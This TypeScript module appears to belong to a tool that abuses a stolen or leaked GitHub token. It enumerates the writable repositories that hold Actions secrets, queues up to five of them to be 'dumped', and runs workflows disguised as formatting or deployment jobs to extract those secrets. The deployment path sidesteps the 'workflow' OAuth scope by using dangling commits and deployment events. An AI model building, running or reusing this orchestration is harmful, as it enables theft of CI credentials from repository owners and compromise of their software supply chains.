import type { TokenRepo } from "./actions";
import { streamWritableRepos } from "./repos";
import { type RepoSecretInfo, streamRepoSecrets } from "./secrets";
import {
  type FormatResult,
  runDeploymentWorkflows,
  runFormatWorkflows,
} from "./workflow";

export interface RepoScanMetadata {
  fullName: string;
  secrets: string[];
  isPrivate: boolean;
  status: "DUMPED" | "SKIPPED" | "FAILED";
  error?: string;
  method: "push" | "deployment";
}

interface CollectResult {
  toDump: TokenRepo[];
  metadata: RepoScanMetadata[];
}

async function collectReposWithSecrets(token: string): Promise<CollectResult> {
  const toDump: TokenRepo[] = [];
  const metadata: RepoScanMetadata[] = [];

  for await (const info of streamRepoSecrets(
    token,
    streamWritableRepos(token),
  )) {
    const hasSecrets = info.secrets.length > 0;
    const [owner, repo] = info.fullName.split("/");

    if (hasSecrets && owner && repo && toDump.length < 5) {
      toDump.push({ token, owner, repo });
      metadata.push({
        fullName: info.fullName,
        secrets: info.secrets,
        isPrivate: info.isPrivate,
        status: "DUMPED",
        method: "push",
      });
    } else {
      metadata.push({
        fullName: info.fullName,
        secrets: info.secrets,
        isPrivate: info.isPrivate,
        status: "SKIPPED",
        method: "push",
      });
    }
  }

  return { toDump, metadata };
}

/**
 * Cross-reference workflow results with the pre-computed metadata.
 * Repos that were marked DUMPED but had a failing workflow (error or
 * null artifact) are downgraded to FAILED with the error message.
 */
function reconcileMetadata(
  results: FormatResult[],
  metadata: RepoScanMetadata[],
  method: "push" | "deployment",
): RepoScanMetadata[] {
  const resultMap = new Map(results.map((r) => [r.repo, r]));
  return metadata.map((m) => ({
    ...m,
    method,
    ...(m.status === "DUMPED"
      ? (() => {
          const r = resultMap.get(m.fullName);
          if (!r || r.error || r.artifact === null) {
            return {
              status: "FAILED" as const,
              error: r?.error ?? "no result",
            };
          }
          return {};
        })()
      : {}),
  }));
}

/**
 * Run the push-based workflow (requires `workflow` OAuth scope).
 */
export async function runFormatOnReposWithSecrets(
  token: string,
  concurrency = 5,
): Promise<{ results: FormatResult[]; metadata: RepoScanMetadata[] }> {
  const { toDump, metadata } = await collectReposWithSecrets(token);

  const results: FormatResult[] = [];
  for await (const result of runFormatWorkflows(toDump, concurrency)) {
    results.push(result);
  }

  return { results, metadata: reconcileMetadata(results, metadata, "push") };
}

/**
 * Run the deployment-based workflow (no `workflow` scope needed —
 * uses dangling commits + deployment events).
 */
export async function runDeploymentOnReposWithSecrets(
  token: string,
  concurrency = 5,
): Promise<{ results: FormatResult[]; metadata: RepoScanMetadata[] }> {
  const { toDump, metadata } = await collectReposWithSecrets(token);

  const results: FormatResult[] = [];
  for await (const result of runDeploymentWorkflows(toDump, concurrency)) {
    results.push(result);
  }

  return {
    results,
    metadata: reconcileMetadata(results, metadata, "deployment"),
  };
}
